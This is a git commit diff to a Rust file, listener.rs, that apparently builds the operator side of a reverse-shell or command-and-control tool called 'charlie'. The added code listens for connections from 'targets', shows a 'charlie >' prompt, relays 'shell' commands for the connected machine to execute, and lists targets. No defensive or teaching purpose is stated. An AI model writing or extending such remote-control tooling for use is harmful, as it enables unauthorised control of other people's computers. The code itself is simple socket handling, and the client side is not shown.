2157b91c1eedf450415b1aef4bd65ac28451b464
godfriedt <60560876+godfriedt@users.noreply.github.com>
2024-05-17 13:52:35 -0500

    Update listener.rs

--- src/listener.rs
+++ src/listener.rs
@@ -1,21 +1,33 @@
-use std::net::TcpListener;
-use std::io::{stdin, Read, Write};
+use std::net::{TcpListener, TcpStream};
+use std::io::{self, stdin, Read, Write};
 use std::str;
 
 pub fn socket_listen(addr: &String, port: &String) {
 
+    let mut target_vec: Vec<&TcpStream> = vec![];
+
     // bind to socket
     let listner = TcpListener::bind(format!("{addr}:{port}")).unwrap();
+
+    println!("Waiting for connection...");
     
     for stream in listner.incoming() {
 
         let mut stream = stream.unwrap();
 
+        println!("Connection received from {}", stream.peer_addr().unwrap());
+
+        target_vec.push(&stream);
+
         loop {
             // write
+            print!("charlie > ");
+            io::stdout().flush().unwrap();
             let mut write_buf = String::new();
             stdin().read_line(&mut write_buf).unwrap();
-            stream.write(write_buf.as_bytes()).unwrap();
+            parse_command(write_buf, &mut stream);
+            
+            // stream.write(write_buf.as_bytes()).unwrap();
 
             // read
             let mut read_buf = [0u8; 1024];
@@ -29,4 +41,33 @@ pub fn socket_listen(addr: &String, port: &String) {
             print!("{}", str::from_utf8(&data).unwrap());
         }
     }
+}
+
+fn charlie_execute_show_targets (stream: &mut TcpStream) {
+    println!("{}",stream.peer_addr().unwrap());
+}
+
+fn parse_command (command: String, stream: &mut TcpStream) {
+    let mut command = command.split(" ");
+    let command_type = command.next().unwrap();
+    match command_type {
+        "shell" => {
+            let shell_command = command.remainder().unwrap().trim();
+            stream.write(shell_command.as_bytes()).unwrap();
+        },
+        "charlie" => {
+            let charlie_command = command.remainder().unwrap().trim();
+            match charlie_command {
+                "show targets" => {
+                    charlie_execute_show_targets(stream);
+                    stream.write("\0".as_bytes()).unwrap();
+                },
+                _ => todo!()
+            };
+        },
+        _ => {
+            println!("{} is not a recognized command.", command_type.trim());
+            stream.write("\0".as_bytes()).unwrap();
+        }
+    };
 }
